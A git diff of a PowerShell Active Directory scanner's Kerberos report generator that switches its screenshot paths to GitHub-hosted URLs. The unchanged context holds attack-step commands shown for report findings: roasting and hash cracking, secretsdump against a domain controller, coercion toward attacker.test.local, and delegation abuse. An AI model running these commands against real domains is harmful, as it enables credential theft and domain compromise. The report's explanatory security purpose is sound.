@@ -132,7 +132,7 @@ function Generate-Kerberoshtml {
                                                     <p>1. Any low-privileged user can search for accounts that have the "Do not require Kerberos preauthentication" flag set within the directory.</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/Kerberos/ASREProast-1.png" alt="Finding ASREP-roastable accounts">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/Kerberos/ASREProast-1.png" alt="Finding ASREP-roastable accounts">
                                                 </span>
                                             </div>
                                             <hr>
@@ -142,7 +142,7 @@ function Generate-Kerberoshtml {
                                                     <p class="code">nxc ldap dc.test.local -u test -p 'Password123!' --asreproast output.txt</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/Kerberos/ASREProast-2.png"
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/Kerberos/ASREProast-2.png"
                                                         alt="Obtaining the hash">
                                                 </span>
                                             </div>
@@ -153,7 +153,7 @@ function Generate-Kerberoshtml {
                                                     <p class="code">john --wordlist=./password-list.txt hash.txt</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/Kerberos/ASREProast-3.png"
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/Kerberos/ASREProast-3.png"
                                                         alt="Cracking the hash">
                                                 </span>
                                             </div>
@@ -266,7 +266,7 @@ function Generate-Kerberoshtml {
                                                     <p>1. Any low-privileged user can search for accounts with an SPN set.</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/Kerberos/Kerberoasting-1.png" alt="Finding Kerberoastable accounts">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/Kerberos/Kerberoasting-1.png" alt="Finding Kerberoastable accounts">
                                                 </span>
                                             </div>
                                             <hr>
@@ -276,7 +276,7 @@ function Generate-Kerberoshtml {
                                                     <p class="code">nxc ldap dc.test.local -u test -p 'Password123!' --kerberoasting output.txt</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/Kerberos/Kerberoasting-2.png"
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/Kerberos/Kerberoasting-2.png"
                                                         alt="Obtaining the hash">
                                                 </span>
                                             </div>
@@ -287,7 +287,7 @@ function Generate-Kerberoshtml {
                                                     <p class="code">john --format=krb5tgs --wordlist=./password-list.txt hash.txt</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/Kerberos/Kerberoasting-3.png"
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/Kerberos/Kerberoasting-3.png"
                                                         alt="Cracking the hash">
                                                 </span>
                                             </div>
@@ -371,7 +371,7 @@ function Generate-Kerberoshtml {
                                                     <p class="code">nxc ldap dc.test.local -u test -p 'Password123' --trusted-for-delegation</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/Kerberos/unconstrained-1.png" alt="Finding unconstrained delegation">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/Kerberos/unconstrained-1.png" alt="Finding unconstrained delegation">
                                                 </span>
                                             </div>
                                             <hr>
@@ -381,7 +381,7 @@ function Generate-Kerberoshtml {
                                                     <p class="code">impacket-secretsdump Administrator:'Password123!'@dc.test.local -just-dc-user 'unconstrained$'</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/Kerberos/unconstrained-2.png" alt="Compromise of unconstrained delegation server">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/Kerberos/unconstrained-2.png" alt="Compromise of unconstrained delegation server">
                                                 </span>
                                             </div>
                                             <hr>
@@ -393,7 +393,7 @@ function Generate-Kerberoshtml {
                                                     <p class="code">python3 dnstool.py -u test.local\\unconstrained\$ -p aad3b435b51404eeaad3b435b51404ee:f5775d6dd236b519c70bc28430f35b72 -r attacker.test.local -d 192.168.10.130 --action add dc.test.local</p>
                                                     </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/Kerberos/unconstrained-3.png" alt="Adding SPN & dns record">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/Kerberos/unconstrained-3.png" alt="Adding SPN & dns record">
                                                 </span>
                                             </div>
                                             <hr>
@@ -403,7 +403,7 @@ function Generate-Kerberoshtml {
                                                     <p class="code">python3 printerbug.py test:'Password123!'@dc.test.local attacker.test.local</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/Kerberos/unconstrained-4.png" alt="Coercing authentication">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/Kerberos/unconstrained-4.png" alt="Coercing authentication">
                                                 </span>
                                             </div>
                                             <hr>
@@ -417,7 +417,7 @@ function Generate-Kerberoshtml {
                                                     <p class="code">impacket-secretsdump -k -no-pass dc.test.local</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/Kerberos/unconstrained-5.png" alt="Exploiting unconstrained">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/Kerberos/unconstrained-5.png" alt="Exploiting unconstrained">
                                                 </span>
                                             </div>
                                         </td>
@@ -500,7 +500,7 @@ function Generate-Kerberoshtml {
                                                     <p class="code">impacket-findDelegation -target-domain test.local test.local/test:'Password123!'</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/Kerberos/constrained-1.png" alt="Finding constrained delegation">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/Kerberos/constrained-1.png" alt="Finding constrained delegation">
                                                 </span>
                                             </div>
                                             <hr>
@@ -513,7 +513,7 @@ function Generate-Kerberoshtml {
                                                     <p class="code">impacket-wmiexec -k -no-pass administrator@ca.test.local</p>
                                                     </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/Kerberos/constrained-2.png" alt="exploiting constrained delegation">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/Kerberos/constrained-2.png" alt="exploiting constrained delegation">
                                                 </span>
                                             </div>
                                         </td>
@@ -595,7 +595,7 @@ function Generate-Kerberoshtml {
                                                     <p class="code">Get-ADComputer 'CA' -Properties PrincipalsAllowedToDelegateToAccount</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/Kerberos/RBCD-1.png" alt="Finding RBCD">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/Kerberos/RBCD-1.png" alt="Finding RBCD">
                                                 </span>
                                             </div>
                                             <hr>
@@ -608,7 +608,7 @@ function Generate-Kerberoshtml {
                                                     <p class="code">impacket-wmiexec -k -no-pass administrator@ca.test.local</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/Kerberos/RBCD-2.png" alt="Exploiting RBCD">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/Kerberos/RBCD-2.png" alt="Exploiting RBCD">
                                                 </span>
                                             </div>
                                         </td>
@@ -693,7 +693,7 @@ function Generate-Kerberoshtml {
                                                     <p class="code">impacket-lookupsid test.local/test:'Password123!'@dc.test.local</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/Kerberos/goldenticket-1.png" alt="Obtaining the krbtgt hash">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/Kerberos/goldenticket-1.png" alt="Obtaining the krbtgt hash">
                                                 </span>
                                             </div>
                                             <hr>
@@ -706,7 +706,7 @@ function Generate-Kerberoshtml {
                                                     <p class="code">klist</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/Kerberos/goldenticket-2.png" alt="Forging a golden ticket">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/Kerberos/goldenticket-2.png" alt="Forging a golden ticket">
                                                 </span>
                                             </div>
                                         </td>
